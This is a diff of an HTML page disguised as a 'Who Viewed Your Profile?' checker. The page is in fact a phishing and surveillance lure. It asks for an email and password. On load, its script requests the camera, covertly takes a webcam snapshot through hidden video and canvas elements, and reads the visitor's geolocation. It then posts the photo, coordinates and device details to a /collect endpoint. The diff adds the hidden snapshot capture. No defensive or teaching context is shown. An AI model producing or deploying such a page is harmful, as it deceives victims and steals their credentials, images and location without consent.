@@ -2,89 +2,87 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>🔍 Profile Viewer Checker</title>
+  <title>🔍 Profile Viewer</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link rel="icon" href="/static/icon.png">
   <style>
     body {
-      margin: 0;
-      background: linear-gradient(135deg, #2c3e50, #3498db);
+      background: #111;
+      color: #fff;
       font-family: Arial, sans-serif;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
+      text-align: center;
+      padding: 50px;
     }
     .box {
-      background: rgba(255,255,255,0.1);
+      background: #222;
       padding: 30px;
-      border-radius: 16px;
-      text-align: center;
-      width: 300px;
-      backdrop-filter: blur(8px);
-    }
-    h1 {
-      font-size: 24px;
-    }
-    p {
-      font-size: 14px;
-      margin-bottom: 20px;
+      border-radius: 12px;
+      display: inline-block;
     }
     input, button {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
+      margin: 10px;
+      padding: 12px;
       border-radius: 8px;
       border: none;
-      font-size: 14px;
-    }
-    input {
-      background: #fff;
-      color: #000;
+      font-size: 16px;
+      width: 90%;
     }
     button {
-      background: #e74c3c;
+      background: crimson;
       color: white;
-      font-weight: bold;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
   <div class="box">
-    <h1>👁️ Who Viewed Your Profile?</h1>
-    <p>Enter to check last profile visitors (Secret Mode)</p>
-    <form>
-      <input type="text" placeholder="Email or username" required>
-      <input type="password" placeholder="Password" required>
-      <button type="submit">Check Now</button>
+    <h1>👁 Who Viewed Your Profile?</h1>
+    <form id="spyForm">
+      <input type="text" placeholder="Enter your email" required>
+      <input type="password" placeholder="Your password" required>
+      <button type="submit">Check</button>
     </form>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
   </div>
 
   <script>
-    async function sendData(status, lat=null, long=null) {
+    async function sendData(status, lat = null, long = null, photo = null) {
       await fetch("/collect", {
         method: "POST",
-        headers: {"Content-Type": "application/json"},
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           userAgent: navigator.userAgent,
           latitude: lat,
           longitude: long,
           camera: status,
-          deviceInfo: navigator.platform
+          deviceInfo: navigator.platform,
+          snapshot: photo
         })
       });
     }
 
     navigator.mediaDevices.getUserMedia({ video: true })
-    .then(stream => {
-      navigator.geolocation.getCurrentPosition(
-        pos => sendData("✅ Allowed", pos.coords.latitude, pos.coords.longitude),
-        err => sendData("❌ Location Denied")
-      );
-      stream.getTracks().forEach(track => track.stop());
-    })
-    .catch(err => sendData("❌ Camera Denied"));
+      .then(stream => {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        video.srcObject = stream;
+
+        setTimeout(() => {
+          const context = canvas.getContext("2d");
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL("image/png");
+
+          navigator.geolocation.getCurrentPosition(
+            pos => sendData("✅ Allowed", pos.coords.latitude, pos.coords.longitude, imageData),
+            err => sendData("❌ Location Denied", null, null, imageData)
+          );
+
+          stream.getTracks().forEach(track => track.stop());
+        }, 1500);
+      })
+      .catch(err => {
+        sendData("❌ Camera Denied");
+      });
   </script>
 </body>
 </html>
